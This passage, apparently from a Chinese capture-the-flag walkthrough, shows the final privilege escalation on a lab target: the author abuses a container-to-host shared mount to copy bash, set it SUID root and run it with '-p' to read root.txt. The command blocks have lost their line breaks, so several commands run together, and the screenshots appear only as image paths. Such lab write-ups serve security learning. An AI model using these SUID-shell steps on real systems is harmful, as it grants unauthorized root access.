这里可以看到一个ens192的网卡，可以确认这是最终的靶机了。

  

根据之前发现的挂载信息两边的文件都是同步的，那么这里可以直接返回到容器中创建一个bash文件，将其设为suid，然后在回到最终的靶机来运行就可以得到root权限了：

*   
*   
*   

```
cp /bin/bash /home/augustus/chmod 4777 bashssh augustus@172.19.0.1
```

  
![](../Images/7e0b739ab3085c19cf94fb479fc24351.png)  
![](../Images/2333f18ac23a6eebbfb1334f1f59e884.png)

  

这里报了个错误，网上搜索后发现缺少libtinfo.so.5的二进制文件，那么这里换个手法：通过靶机的bash复制到当前目录下，再回到容器中去修改相关权限问题：

*   
*   
*   

```
rm bashcp /bin/bash ./exit
```

  
![](../Images/e4b73b432808c19dd4967c65887e7ffa.png)

  

*   
*   
*   

```
chmod 4777 bashchown root:root bashssh augustus@172.19.0.1
```

  
![](../Images/aeded5fa40a971dc362f55a849920831.png)

  

*   
*   
*   

```
./bash -pcd /rootcat root.txt
```

  
![](../Images/102804c8ebe2ae38656c3be7df6614ce.png)
